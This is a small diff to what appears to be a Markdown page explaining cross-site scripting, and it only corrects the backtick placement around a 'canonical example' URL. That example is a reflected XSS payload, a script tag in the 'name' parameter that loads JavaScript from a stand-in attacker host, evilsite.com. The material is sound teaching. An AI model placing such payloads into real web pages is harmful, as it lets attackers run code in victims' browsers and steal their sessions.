@@ -99,7 +99,7 @@ Header2: Value2
 #### Canonical Example
 
 - You go to http://example.com/vulnerable?
-  `name=<script/xss%20src=http://evilsite.com/my.js`> and it generates:
+  `name=<script/xss%20src=http://evilsite.com/my.js>` and it generates:
 
 ```
 <!doctype html><html>
